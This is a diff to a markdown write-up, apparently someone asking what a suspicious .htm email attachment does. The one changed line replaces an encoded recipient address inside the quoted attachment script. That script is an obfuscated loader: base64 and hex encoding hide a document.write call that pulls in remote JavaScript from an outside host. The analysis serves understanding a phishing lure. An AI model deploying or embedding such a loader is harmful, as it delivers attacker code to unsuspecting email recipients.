@@ -24,7 +24,7 @@ I cannot make sense out of it... maybe it is meant to lure people to click the h
 ### htm
 Here is the content of the .htm attachment to the mail:
 
-<script>var _fs=['PHNjcmlwdCBzcmM9Imh0dHBzOi8vZmljdGlvbmFsLWRtay52ZXJjZWwuYXBwLyI+PC9zY3JpcHQ+Cg==',"\x77\x72\x69\x74\x65"]; var h = "dGtlbXBAdC1vbmxpbmUuZGU="; document[_fs[1]](unescape(atob(_fs[0])))</script>
+<script>var _fs=['PHNjcmlwdCBzcmM9Imh0dHBzOi8vZmljdGlvbmFsLWRtay52ZXJjZWwuYXBwLyI+PC9zY3JpcHQ+Cg==',"\x77\x72\x69\x74\x65"]; var h = "bXltYWlsQGhvdG1haWwuY29t"; document[_fs[1]](unescape(atob(_fs[0])))</script>
 
 
 ### Meaning
